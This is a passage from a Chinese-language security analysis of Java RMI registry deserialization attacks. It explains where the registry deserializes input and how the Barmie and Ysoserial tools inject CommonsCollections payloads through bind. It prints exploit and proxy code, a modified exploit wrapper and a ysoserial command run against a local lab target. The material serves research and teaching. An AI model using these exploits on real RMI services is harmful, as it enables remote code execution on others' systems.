<p>接下来就是比较通用的攻击情景了：攻击者模拟RMI服务端攻击RMI注册端</p>
<p>我们先来看看RMI服务端的漏洞触发点代码：<code>/rt.jar!/sun/rmi/server/UnicastServerRef.class#RegistryImpl_Skel</code></p>
<blockquote>
<p>环境：RMI-Server ServerAndRegister 分析</p>
<p>jdk:1.7u80</p>
<p>jdk7u80版本这个地方在调试<code>RegistryImpl_Skel.class</code>这个神奇的文件的时候有一个非常有趣而坑爹的情况，那就是这个class压根没法调试。百思不得其解，去下了openjdk 的jdk源码，发现源码中根本没有这个<code>RegistryImpl_Skel.java</code>文件。</p>
<p>跟wh1tp1g讨论了下，应该是一个动态生成的class，所以不能调试。然后非常神奇在jdk8版本的8u112也不能调试，但是8u141之后又可以了。如果有想自己调试的同学可以注意下这个点。</p>
</blockquote>
<p><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>（我们可以叫做RMI注册任务分发处，就是注册端处理请求的地方）其实是从<code>sun.rmi.server.UnicastServerRef#dispatch</code>（RMI请求分发处）那边过来的。</p>
<p>由于RegistryImpl_Skel不能下断点，我们在bind函数执行处<code>sun.rmi.registry.RegistryImpl#bind</code>下一个断点，直接运行，就可以得到调用栈，再回去找就好了。</p>
<p><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="keyword">int</span> var3, <span class="keyword">long</span> var4)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//一处接口hash验证</span></span><br><span class="line">    	<span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SkeletonMismatchException(<span class="string">"interface hash mismatch"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//设定变量开始处理请求</span></span><br><span class="line">            <span class="comment">//var6为RegistryImpl对象，调用的就是这个对象的bind、list等方法</span></span><br><span class="line">            RegistryImpl var6 = (RegistryImpl)var1;</span><br><span class="line">            <span class="comment">//接受客户端输入流的参数变量</span></span><br><span class="line">            String var7;</span><br><span class="line">            Remote var8;</span><br><span class="line">            ObjectInput var10;</span><br><span class="line">            ObjectInput var11;</span><br><span class="line">            <span class="comment">//var3表示对应的方法值0-4，这个数字是跟RMI客户端约定好的</span></span><br><span class="line">            <span class="comment">//比如RMI客户端发送bind请求：就是sun.rmi.registry.RegistryImpl_Stub#bind中的这一句</span></span><br><span class="line">            <span class="comment">//super.ref.newCall(this, operations, 0, 4905912898345647071L);</span></span><br><span class="line">            <span class="keyword">switch</span>(var3) &#123;</span><br><span class="line">            <span class="comment">//统一删除了try等语句</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    <span class="comment">//bind(String,Remote)分支</span></span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">//1.反序列化触发处</span></span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                	var6.bind(var7, var8);</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    <span class="comment">//list()分支</span></span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                    String[] var97 = var6.list();</span><br><span class="line">                    ObjectOutput var98 = var2.getResultStream(<span class="keyword">true</span>);</span><br><span class="line">                    var98.writeObject(var97);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				  <span class="comment">//lookup(String)分支</span></span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">//2.反序列化触发处</span></span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                	var8 = var6.lookup(var7);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				  <span class="comment">//rebind(String,Remote)分支</span></span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">//3.反序列化触发处</span></span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                	var6.rebind(var7, var8);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                    <span class="comment">//unbind(String)分支</span></span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">//4.反序列化触发处</span></span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                	var6.unbind(var7);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"invalid method number"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>可以得到4个反序列化触发处：<strong>lookup</strong>、<strong>unbind</strong>、<strong>rebind</strong>、<strong>bind</strong>。</p>
<h4 id="RMI客户端角度的lookup攻击RMI注册端"><a href="#RMI客户端角度的lookup攻击RMI注册端" class="headerlink" title="RMI客户端角度的lookup攻击RMI注册端"></a>RMI客户端角度的lookup攻击RMI注册端</h4><blockquote>
<p>其中lookup是以客户端的角度攻击，但是其原理与以服务端角度攻击的bind，rebind，unbind完全一致。我们会在最后的罗列中把lookup区分开，不再领出来细说。</p>
<p>此处建立一个小标题，作为提醒</p>
</blockquote>
<p>这里可能会有一个疑问：<br><strong>4个接口有两类参数，String和Remote类型的Object，那么是不是我们只能攻击必须要是Remote类型的Object接口呢？即实际上只有bind、rebind接口才是可以攻击的？</strong></p>
<p>之所以会产生这个疑问是由于 有些文章会说替换Remote类型的参数为payload 或者 我们看Ysoserial的payload的构造过程也是构造出一个Remote类型的payload Object，再把正常的Remote参数替换为Remote类型的payload，这些都给我们一种只有Remote参数才能反序列化的假象</p>
<p>虽然我们看到RMI注册端的解析过程是直接反序列化传参，看样子String和Remote的参数位置都是可以的，但还是会摇摆不定。</p>
<p>但事实是 <strong>RMI注册端没有任何校验，你的payload放在Remote参数位置可以攻击成功，放在String参数位置也可以攻击成功</strong>。<br>而之所以Ysoserial生成payload要变成Remote格式，是因为RMI服务端发这个数据包的流程中会需要这个对象是Remote类型的，我们之后将证明，并且详细说明。</p>
<h3 id="Barmie-Bind"><a href="#Barmie-Bind" class="headerlink" title="Barmie - Bind"></a>Barmie - Bind</h3><p>各个工具都对于服务端打注册端的bind攻击写了exploit，相对于上面攻击形式，bind攻击更具备通用性。</p>
<p>Barmie对于Bind接口有探测和攻击两个模块</p>
<p>简单总结一下探测模块：<code>nb.barmie.modes.attack.attacks.Java.IllegalRegistryBind#canAttackEndpoint</code></p>
<ol>
<li>新建一个RMI代理服务器，在这个代理服务器中会对输出的数据包进行重新构造</li>
<li>获取这个RMI对象，调用其bind方法</li>
<li>重构客户端输出的数据包，改变其内容为预设好的一个Object</li>
<li>服务端肯定会报错（由于我们预设的Object不会被正确解析执行），根据服务端返回报错栈，去匹配是否有<code>filter status: REJECTED</code>字符串来判断，对方的JDK版本我们是否可以攻击。（这个字符串是JEP290拦截导致的，之后我们会提到）</li>
<li>如果没有匹配到就说明可以攻击。</li>
</ol>
<p>再来详细看看流程比较相似的攻击模块<code>nb.barmie.modes.attack.attacks.Java.IllegalRegistryBind#executeAttack</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">executeAttack</span><span class="params">(RMIEndpoint ep, DeserPayload payload, String cmd)</span> <span class="keyword">throws</span> BaRMIeException </span>&#123;</span><br><span class="line">    RMIBindExploitProxy proxy = <span class="keyword">null</span>;<span class="comment">//代理器</span></span><br><span class="line">    Registry reg;</span><br><span class="line">	<span class="comment">//已删去try部分</span></span><br><span class="line">    <span class="comment">//1.初始化一个bind RMI注册端代理器</span></span><br><span class="line">    <span class="comment">//我们的payload从这里给入</span></span><br><span class="line">    proxy = <span class="keyword">new</span> RMIBindExploitProxy(InetAddress.getByName(ep.getEndpoint().getHost()), ep.getEndpoint().getPort(), <span class="keyword">this</span>._options, payload.getBytes(cmd, <span class="number">0</span>));</span><br><span class="line">    proxy.startProxy();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.从RMI注册端代理器获取一个注册端对象</span></span><br><span class="line">    reg = LocateRegistry.getRegistry(proxy.getServerListenAddress().getHostAddress(), proxy.getServerListenPort());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.通过RMI注册端代理器调用bind，修改参数为给定的payload</span></span><br><span class="line">    <span class="comment">//reg.bind(随机字符串,一个接口需要的Remote接口)</span></span><br><span class="line">    <span class="comment">//但是经过注册端代理器之后，这里的参数会被改为：bind(PAYLOAD, null)，没错payload是String的位置</span></span><br><span class="line">    reg.bind(<span class="keyword">this</span>.generateRandomString(), <span class="keyword">new</span> BaRMIeBindExploit());</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">BaRMIeBindExploit</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后形成的调用是<code>bind(PAYLOAD, null)</code><br>看看具体实现<code>nb.barmie.net.proxy.thread.BindPayloadInjectingProxyThread#handleData</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteArrayOutputStream <span class="title">handleData</span><span class="params">(ByteArrayOutputStream data)</span> </span>&#123;</span><br><span class="line">		ByteArrayOutputStream out;</span><br><span class="line">		<span class="keyword">int</span> blockLen;</span><br><span class="line">		<span class="keyword">byte</span>[] dataBytes;</span><br><span class="line">		<span class="comment">//获取输入的长度</span></span><br><span class="line">		dataBytes = data.toByteArray();</span><br><span class="line">		<span class="comment">//判断这个输入包是不是一个RMI调用包，如果是的话进行修改</span></span><br><span class="line">		<span class="keyword">if</span>(dataBytes.length &gt; <span class="number">7</span> &amp;&amp; dataBytes[<span class="number">0</span>] == (<span class="keyword">byte</span>)<span class="number">0x50</span>) &#123;</span><br><span class="line">			<span class="comment">//调用包以 TC_BLOCKDATA 标签开头,获取它的标签长度</span></span><br><span class="line">			blockLen = (<span class="keyword">int</span>)(dataBytes[<span class="number">6</span>] &amp; <span class="number">0xff</span>);</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//自己构建一个新的字节流，以原来包的长度和TC_BLOCKDATA标签开头</span></span><br><span class="line">			out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">			out.write(dataBytes, <span class="number">0</span>, blockLen + <span class="number">7</span>);</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//在后面写入我们给定的payload</span></span><br><span class="line">			out.write(<span class="keyword">this</span>._payload, <span class="number">0</span>, <span class="keyword">this</span>._payload.length);</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//最后给一个NULL标签（作为bind方法的第二个参数）</span></span><br><span class="line">			out.write((<span class="keyword">byte</span>)<span class="number">0x70</span>);</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//把新的数据包发送给服务端</span></span><br><span class="line">			<span class="keyword">return</span> out;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">//不是RMI调用的数据包就直接发送</span></span><br><span class="line">			<span class="keyword">return</span> data;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这边完全是自己重构了客户端发往服务端的数据包，并且给入了两个参数，<strong>payload</strong>替换<strong>String</strong>，<strong>null</strong>替换<strong>Remote</strong>。</p>
<p>我们再攻击一下我们的RMI服务端靶机，用wireshark抓包确认下，顺便把后面Ysoserial-RMIRegistryExploit的包先提上来对比一下：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16uk8849j31kx0r2wod.jpg" alt="barmie-bind.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16uop4x4j31ei0ovjzl.jpg" alt="YSO-RMI-bind.png"></p>
<p>可以发现Barmie的bind攻击是通过第一个String参数替换payload（Hashset就是CC的攻击链）攻击成功的，而Ysoserial的RMIRegisterExpolit模块的bind攻击是通过构造了一个符合Remote条件的第二个Remote参数（把CC的攻击链包装成了Remote）攻击成功的。</p>
<p>那么之前的疑问 <strong>是不是我们只能攻击必须要是Remote类型的Object接口呢？</strong>也就破案了：不是，是String和Remote类型均可。</p>
<p>那么也就是说<strong>lookup</strong>、<strong>unbind</strong>、<strong>rebind</strong>、<strong>bind</strong>四个接口都可以利用同样的原理攻击。</p>
<h3 id="Ysoserial-RMIRegistryExploit-Bind"><a href="#Ysoserial-RMIRegistryExploit-Bind" class="headerlink" title="Ysoserial-RMIRegistryExploit - Bind"></a>Ysoserial-RMIRegistryExploit - Bind</h3><p>那么Ysoserial不写代理器还去自己把CC攻击链包装成了Remote类型，也挺有意思的，我们看看它是怎么做的。</p>
<p>命令行用这个命令调用exploit模块：<code>java -cp F:\xxx\java\ysoserial.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections1 &quot;calc&quot;</code></p>
<p>看下核心代码<code>ysoserial.exploit.RMIRegistryExploit#exploit</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">exploit</span><span class="params">(<span class="keyword">final</span> Registry registry,</span></span></span><br><span class="line"><span class="function"><span class="params">			<span class="keyword">final</span> Class&lt;? extends ObjectPayload&gt; payloadClass,</span></span></span><br><span class="line"><span class="function"><span class="params">			<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">new</span> ExecCheckingSecurityManager().callWrapped(<span class="keyword">new</span> Callable&lt;Void&gt;()&#123;<span class="function"><span class="keyword">public</span> Void <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">//获取payload</span></span><br><span class="line">			ObjectPayload payloadObj = payloadClass.newInstance();</span><br><span class="line">            Object payload = payloadObj.getObject(command);</span><br><span class="line">			String name = <span class="string">"pwned"</span> + System.nanoTime();</span><br><span class="line">            <span class="comment">//将payload封装成Map</span></span><br><span class="line">            <span class="comment">//然后通过sun.reflect.annotation.AnnotationInvocationHandler建立起动态代理</span></span><br><span class="line">            <span class="comment">//变为Remote类型</span></span><br><span class="line">			Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//封装的remote类型，通过RMI客户端的正常接口发出去</span></span><br><span class="line">				registry.bind(name, remote);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">			Utils.releasePayload(payloadObj, payload);</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用到了<strong>动态代理</strong>，简单总结一下：</p>
<ul>
<li>被代理的接口：Remote.class</li>
<li>代理的实现类（也可以理解为拦截器）：sun.reflect.annotation.AnnotationInvocationHandler</li>
<li>动态代理之后的对象：调用实现Remote接口的绑定代理的对象的任意方法都会自动被拦截，前往<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的invoke方法执行。</li>
</ul>
<p>简单看下是怎么ysoserial是怎么样完成动态代理的，即<code>ysoserial.payloads.util.Gadgets#createMemoitizedProxy</code>的实现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createMemoitizedProxy</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//Map是我们传入的，需要填充进入AnnotationInvocationHandler构造方法中的对象。</span></span><br><span class="line">    <span class="comment">//iface是被动态代理的接口</span></span><br><span class="line">    <span class="keyword">return</span> createProxy(createMemoizedInvocationHandler(map), iface, ifaces);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里创建了一个`sun.reflect.annotation.AnnotationInvocationHandler`拦截器的对象</span></span><br><span class="line"><span class="comment">//传入了我们含有payload的map，进入构造方法，会在构造方法内进行赋值给对象的变量</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title">createMemoizedInvocationHandler</span> <span class="params">( <span class="keyword">final</span> Map&lt;String, Object&gt; map )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//正式开始绑定代理动态代理</span></span><br><span class="line"><span class="comment">//ih 拦截器</span></span><br><span class="line"><span class="comment">//iface 需要被代理的类</span></span><br><span class="line"><span class="comment">//ifaces 这里没有</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createProxy</span> <span class="params">( <span class="keyword">final</span> InvocationHandler ih, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt;[] allIfaces = (Class&lt;?&gt;[]) Array.newInstance(Class.class, ifaces.length + <span class="number">1</span>);</span><br><span class="line">    allIfaces[ <span class="number">0</span> ] = iface;</span><br><span class="line">    <span class="keyword">if</span> ( ifaces.length &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        System.arraycopy(ifaces, <span class="number">0</span>, allIfaces, <span class="number">1</span>, ifaces.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//上面整合了一下需要代理的接口到allIfaces里面</span></span><br><span class="line">    <span class="comment">//然后Proxy.newProxyInstance，完成allIfaces到ih的绑定</span></span><br><span class="line">    <span class="comment">//（Gadgets.class.getClassLoader()就是获取了一个加载器，不用太管）</span></span><br><span class="line">    <span class="comment">//iface.cast是将获取的绑定结果对象转变为iface（即Remote）的对象类型</span></span><br><span class="line">    <span class="keyword">return</span> iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这边就完成了一个通过<strong>动态代理</strong>封装成了一个Remote.class的接口对象，这样就可以在客户端正常调用<code>registry.bind(name, remote);</code>了，因为bind的接口这么定义了需要Remote对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bind</span><span class="params">(String name, Remote obj)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span>;</span><br></pre></td></tr></table></figure>
<p>那么我们传输过去了我们的remote动态代理对象，在服务端解析过程中与动态代理有关系么？</p>
<p><strong>答案是：P关系都没有！</strong></p>
<p>上面可以看到我们的使用的是yso-cc1的payload去在jdk1.7u80中触发payload：而cc1的触发同样使用到了动态代理机制，该payload在服务端的触发与动态代理也息息相关：</p>
<ul>
<li>cc1的payload是一个AnnotationInvocationHandler对象，跟上面类似，在其构造的时候，我们把一个 <strong>动态代理到AnnotationInvocationHandler.invoke方法的map</strong> 塞入了其memberValues属性中</li>
<li>在服务端触发var.readobject()时，会进入AnnotationInvocationHandler类的readobject()</li>
<li>在readobject()中会执行<code>this.memberValues.entrySet()</code>。entrySet，这是一个map的方法。根据动态代理性质，我们绑定了map的方法到AnnotationInvocationHandler.invoke方法，所以这边就会进入invoke方法。</li>
<li>同时我们还在这个处心积虑想进来的invoke方法的AnnotationInvocationHandler对象中又弄了一个lazyMap在memberValues属性中！只要触发了这个lazyMap的get方法就等于成功。（之后复杂的就略了）</li>
<li>而AnnotationInvocationHandler.invoke方法中刚好有<code>this.memberValues.get(var4);</code>，而这个this.memberValues就是lazyMap。</li>
</ul>
<p>这边简单讲了下动态代理在一般序列化链中的作用，就是<strong>连接一个类的任意方法到一个拦截器的invoke方法（到invoke方法！）</strong></p>
<p>而在这边Ysoserial通过动态代理产生的<strong>remote对象丝毫没有用到动态代理核心的特点（到invoke方法中）</strong>。</p>
<p>它实际做的只是把payload放在一个remote接口的类的属性里面。然后在服务端反序列化的时候，利用反序列化一个对象的过程中会递归类的属性进行反序列化的特点，来反序列化我们的payload，从而触发漏洞。</p>
<p>使用动态代理只是因为：动态代理也同样可以做到把payload放在AnnotationInvocationHandler拦截器的属性里面，然后动态代理可以把拦截器包装成任意类接口，如下：</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16uw9lznj31do0bttav.jpg" alt="yso-payload.png"></p>
<p>同样我们也可以不用动态代理，自己实现一个remote接口的类，然后放入payload，效果是一样的。</p>
<p>修改一点点：<code>ysoserial.exploit.RMIRegistryExploit#exploit</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//加个Remote接口的类，要支持序列化</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">BindExploit</span> <span class="keyword">implements</span> <span class="title">Remote</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//弄个地方放payload</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object memberValues;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">BindExploit</span><span class="params">(Object payload)</span> </span>&#123;</span><br><span class="line">    	memberValues = payload;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">exploit</span><span class="params">(<span class="keyword">final</span> Registry registry,</span></span></span><br><span class="line"><span class="function"><span class="params">			<span class="keyword">final</span> Class&lt;? extends ObjectPayload&gt; payloadClass,</span></span></span><br><span class="line"><span class="function"><span class="params">			<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">new</span> ExecCheckingSecurityManager().callWrapped(<span class="keyword">new</span> Callable&lt;Void&gt;()&#123;<span class="function"><span class="keyword">public</span> Void <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">			ObjectPayload payloadObj = payloadClass.newInstance();</span><br><span class="line">            Object payload = payloadObj.getObject(command);</span><br><span class="line">			String name = <span class="string">"pwned"</span> + System.nanoTime();</span><br><span class="line">			<span class="comment">//yso动态代理包装</span></span><br><span class="line">			<span class="comment">//Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);</span></span><br><span class="line">            <span class="comment">//自己包装</span></span><br><span class="line">            Remote remote_lala = <span class="keyword">new</span> BindExploit(payload);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				<span class="comment">//registry.bind(name, remote);</span></span><br><span class="line">                <span class="comment">//自己包装</span></span><br><span class="line">                 registry.bind(name, remote_lala);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">			Utils.releasePayload(payloadObj, payload);</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">		&#125;&#125;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16v3vulhj30vz044q34.jpg" alt="yso-自己包装.png"></p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16v85jyoj31720g2djn.jpg" alt="yso-自己包装-calc.png"></p>
<p>这里有一个不是很清楚的问题，自实现remote接口往里放入payload，在RMI客户端有这个类，那序列化传输到RMI服务端，<strong>服务端环境里是没有这个类的，是否会报错，无法利用</strong>？？</p>
<p>本地测试实际上是两个java项目，攻击方yso项目，服务方RMIserialize项目，因此环境是不通的。</p>
<p>测试报错可以证明，是找不到这个类的，但是却不影响利用。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16wjm7xfj32210wp15p.jpg" alt="bind-自实现类.png"></p>
<p>可以从报错信息中看到是ClassNotFound的，但是仍然弹框成功。大概的理由猜测应该是反序列化恢复一个类的时候会先去处理好他的序列化变量，再去进行组装恢复成类。我们触发payload的过程是恢复他的序列化变量的时候，而之后找得到找不到这个类就不重要了。</p>
<blockquote>
